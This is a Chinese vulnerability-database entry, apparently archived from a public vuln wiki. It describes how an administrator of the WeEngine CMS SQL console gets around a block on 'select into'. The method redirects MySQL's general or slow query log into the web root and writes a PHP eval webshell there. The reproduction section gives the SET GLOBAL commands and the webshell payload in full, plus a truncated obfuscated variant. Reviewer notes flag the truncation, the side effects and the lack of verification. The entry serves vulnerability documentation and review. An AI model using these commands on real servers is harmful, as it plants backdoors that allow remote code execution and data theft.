---
source: "hatch 补库批 20260928"
title: "微擎后台SQL控制台与MySQL日志 日志写PHP绕过应用SQL关键字限制"
product: "微擎后台SQL控制台与MySQL日志"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；数据库高权限SET GLOBAL、可写Web根与PHP解析"
prerequisites: "后台管理员且DB高级权限"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%20%E5%90%8E%E5%8F%B0%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E5%86%99shell.md"
id: "vw-ba04eb452b9628f763e3ef95"
entity_id: "ve-ba04eb452b9628f763e3ef95"
schema_version: "1"
---

# 微擎后台SQL控制台与MySQL日志 日志写PHP绕过应用SQL关键字限制

## 条目说明

- 对象与具体问题：微擎后台SQL控制台与MySQL日志；日志写PHP绕过应用SQL关键字限制
- 版本、配置及部署条件：版本未知；数据库高权限SET GLOBAL、可写Web根与PHP解析
- 认证与权限前提：后台管理员且DB高级权限
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 禁用函数不是PHP disable_functions，实际select into受限后改MySQL日志，不应混淆
- 开启general_log/slow_query_log并改全局路径影响全库与敏感查询日志，缺恢复原设置/删除文件
- 所谓免杀shell SQL在$处截断，不能认完整可用；静态eval键未引号受PHP版本影响
- slow log配sleep11依赖long_query_time等阈值，不保证记录/执行；无修复/厂商漏洞边界

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

#### 1.站点设置里面打开调试

![](./.resource/微擎后台绕过禁用函数写shell/media/rId25.png)

#### 2.执行语句

select into被禁止

![](./.resource/微擎后台绕过禁用函数写shell/media/rId27.png)

#### 3.利用日志文件写shell

    show variables like '%general%';  #查看配置

    set global general_log = on;  #开启general log模式

    set global general_log_file = '/var/www/html/1.php';   #设置日志目录为shell地址

    select '<?php eval($_POST[cmd]);?>'  #写入shell

![](./.resource/微擎后台绕过禁用函数写shell/media/rId29.png)

#### 4.SQL查询免杀shell的语句

    SELECT "<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$

#### 补充:来自土司\@GuoKerSb的分享

在无法修改general\_log\_file指向的地址且网站用户量多时刻处于查询的状态，我们还可以通过启动slow\_query\_log（慢查询日志，默认关闭）来写shell

    set global slow_query_log=1;
    set global slow_query_log_file='/var/www/html/1.php';
    select '<?php eval($_POST[cmd]);?>' or sleep(11);

四、参考链接
------------

> <https://www.vulnbug.com/Exploit/Microcomputer-CMS-bypasses-disabled-Intooutfile-and-safe-dog.html>
